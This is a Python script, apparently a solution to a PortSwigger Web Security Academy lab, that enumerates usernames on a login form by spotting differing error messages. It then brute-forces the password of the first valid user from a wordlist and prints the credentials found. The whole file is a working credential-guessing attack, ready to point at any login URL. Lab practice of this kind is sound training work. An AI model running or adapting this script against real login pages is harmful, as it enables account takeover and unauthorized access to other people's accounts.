# -------------------------------------------------------------
# Author: Abdarhman | APT_Bug
# GitHub: https://github.com/abdarhman1337
# Target: PortSwigger Lab 
# Description: Username enumeration via different responses
# 
# -------------------------------------------------------------



import requests
import re



url = "https://0a0c00f504f.web-security-academy.net/login"          # change this url to yours
cookies = {'session': 'nLHToGfdMG2Con'}                                #change cookie to yours 


with open('/your/username/path.txt', 'r') as file:                      # add your UserName_PATH.txt
    usernames = file.readlines()

with open('/your/password/path.txt', 'r') as file:                     # add your Password_PATH.txt
    passwords = file.readlines()

valid_user = []
valid_passwd = []

def username_enum():
    for user in usernames:
        user = user.strip()
        data = {
            'username': user,
            'password': '1234'  
        }
        resp = requests.post(url=url, data=data)
        
        if re.search('Invalid username', resp.text):
            print(f'[-] invalid username : {user} ')
        else:
            print(f'[+] maybe valid username : {user} ')
            valid_user.append(user)
            break  

def password_enum():
    for passwd in passwords:
        passwd = passwd.strip()
        data = {
            'username': valid_user[0],  
            'password': passwd
        }
  
        resp = requests.post(url=url, data=data)
        
        if re.search('Incorrect password', resp.text):
            print(f'[-] invalid password : {passwd} ')
        else:
            print(f'[+] maybe valid password : {passwd}')
            valid_passwd.append(passwd)
            break  


print('\n')
print('='*20 + 'TRYING USERNAME'+ '='*20  )

username_enum()

print('\n')
print('='*20 + 'TRYING PASSWORD'+ '='*20  )
print('\n')
password_enum()

if valid_user and valid_passwd:
    print("=" * 40)
    print(f'[✅] VALID CREDENTIALS FOUND:')
    print(f'Username: {valid_user[0]}')
    print(f'Password: {valid_passwd[0]}')
    print("=" * 40)
else:
    print("[❌] Failed to find valid credentials.")
